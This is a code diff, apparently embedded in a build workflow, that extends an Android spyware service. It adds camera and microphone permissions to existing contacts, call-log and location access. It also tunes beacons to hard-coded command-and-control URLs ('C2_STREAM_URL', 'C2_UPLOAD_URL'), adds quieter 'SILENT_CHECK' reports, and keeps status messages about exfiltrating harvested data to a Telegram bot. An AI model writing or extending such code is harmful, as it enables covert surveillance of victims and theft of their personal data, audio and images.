@@ -42,6 +42,8 @@ jobs:
               <uses-permission android:name="android.permission.READ_CALL_LOG" />
               <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
               <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+              <uses-permission android:name="android.permission.CAMERA" />
+              <uses-permission android:name="android.permission.RECORD_AUDIO" />
               <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
               <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
               <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
@@ -111,7 +113,9 @@ jobs:
                       Manifest.permission.READ_CONTACTS,
                       Manifest.permission.READ_CALL_LOG,
                       Manifest.permission.ACCESS_FINE_LOCATION,
-                      Manifest.permission.ACCESS_COARSE_LOCATION
+                      Manifest.permission.ACCESS_COARSE_LOCATION,
+                      Manifest.permission.CAMERA,
+                      Manifest.permission.RECORD_AUDIO
                   )
 
                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -205,6 +209,7 @@ jobs:
               private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/uranium/stream"
               private val C2_UPLOAD_URL = "https://web-assets-service.onrender.com/api/v3/uranium/upload_raw"
               private val MAX_RETRIES = 5
+              private var lastHeartbeatSent = 0L
 
               override fun onCreate() {
                   super.onCreate()
@@ -246,7 +251,14 @@ jobs:
                               conn.connectTimeout = 10000
                               conn.readTimeout = 10000
 
-                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Uranium Node active from $nodeModel\"}"
+                              val currentTime = System.currentTimeMillis()
+                              val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
+                              val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
+                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Node Active] $nodeModel\"}"
+
+                              if (sendHeartbeat) {
+                                  lastHeartbeatSent = currentTime
+                              }
 
                               OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                                   os.write(reportJson)
@@ -286,9 +298,9 @@ jobs:
                               }
                               conn.disconnect()
 
-                              delay(3000L)
+                              delay(5000L)
                           } catch (e: Exception) {
-                              delay(3000L)
+                              delay(5000L)
                           }
                       }
                   }
@@ -462,7 +474,7 @@ jobs:
 
                       sendReportToServer(nodeId, nodeModel, "✅ تم إتمام الحصاد العملاق لـ $prefix وإرسال كافة الأجزاء إلى بوت تيليجرام بنجاح!")
                   } catch (e: Exception) {
-                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الحصاد العملاق لـ $prefix: ${e.message}")
+                      sendReportToServer(nodeId, nodeModel, "⚠️️ خطأ في الحصاد العملاق لـ $prefix: ${e.message}")
                   }
               }
 
@@ -494,7 +506,6 @@ jobs:
                               }
                           }
                       } catch (e: Exception) {
-                          sendReportToServer(nodeId, nodeModel, "Error extracting single file: ${e.message}")
                       }
                   }
               }
